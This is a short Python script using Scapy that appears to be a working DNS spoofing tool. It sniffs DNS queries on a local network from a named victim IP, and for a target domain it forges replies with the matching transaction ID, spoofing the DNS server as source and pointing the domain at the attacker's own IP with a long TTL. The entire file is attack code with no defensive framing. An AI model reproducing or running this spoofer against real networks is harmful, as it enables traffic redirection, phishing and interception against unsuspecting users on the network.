import os
from scapy.all import *


bpf_filt = 'udp port 53'
victim_ip = "192.168.1.52"
my_ip = "192.168.1.60"
router_ip = "192.168.1.1"
name = "www.hacknmatics.com"
name2 = "hacknmatics.com"

def send_fake_response(tid, port, dns_ip):
	ip = IP(src=dns_ip,dst=victim_ip)
	udp = UDP(sport=53,dport=port)
	dnsqr = DNSQR(qname=name, qtype='A', qclass='IN')
	dnsrr = DNSRR(rrname=name, ttl=60000, type="A", rclass="IN", rdata=my_ip)
	dns = DNS(id=tid, qr=1, aa=0, rd=1, ra=1, rcode='ok', qd=dnsqr, an=dnsrr)


	pkt = ip/udp/dns

	pkt.show()


	send(pkt, iface="wlp2s0")

def response(pkt):
	pname = pkt[DNS].qd.qname[:-1]
	port = pkt[UDP].sport
	answer = pkt[UDP].qr
	dns_ip = pkt[IP].dst
	# print(str(port)+":"+pname)
	if (pname == name or pname == name2) and answer == 0:
		pkt.show()
		tid = pkt[DNS].id
		send_fake_response(tid, port, dns_ip)
	# if pkt[DNSQR] is not None:
	# 	if pkt[DNS].qd.qname[:-1] == name:
	# 		tid = pkt[DNS].id
	# 		print("ID: " + str(tid))
	# 		pkt.show()
	# 		# send_fake_response(tid)
	# 	else:
	# 		print('bad packet')

sniff(filter=bpf_filt , iface='wlp2s0', store=0, prn=response)